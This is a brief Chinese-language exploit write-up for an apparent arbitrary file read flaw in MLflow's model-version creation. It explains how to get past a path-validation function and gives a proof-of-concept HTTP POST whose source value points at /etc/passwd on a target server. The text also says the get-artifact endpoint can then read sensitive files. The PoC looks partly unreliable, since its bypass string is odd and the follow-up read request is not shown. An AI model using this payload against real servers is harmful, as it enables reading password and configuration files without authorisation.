验证漏洞存在方法
    - 尝试通过构造特殊的source参数访问服务器文件，如果能够读取到非预期的系统文件，则说明存在漏洞

漏洞利用方法
    - 该漏洞存在于`_create_model_version()`函数中，由于对source参数验证不足，攻击者可以绕过`_validate_non_local_source_contains_relative_paths(source)`函数的检查，实现任意文件读取
    - 漏洞利用的关键在于构造能够绕过路径检查的source参数，利用未引用的URL字符和处理逻辑缺陷
    - 通过向`/model-versions/get-artifact`端点发送特制请求，可以读取服务器上的敏感文件

PoC示例：
```http
POST /api/2.0/mlflow/model-versions/create HTTP/1.1
Host: target-mlflow-server:5000
Content-Type: application/json

{
  "name": "test-model",
  "source": "file:///etc/passwd?bypass=../../",
  "run_id": "test-run"
}
```

注意：实际利用可能需要根据目标MLflow服务器的具体配置和版本进行调整。该漏洞允许攻击者读取服务器上的任意文件，包括敏感配置文件、密码文件等。
```
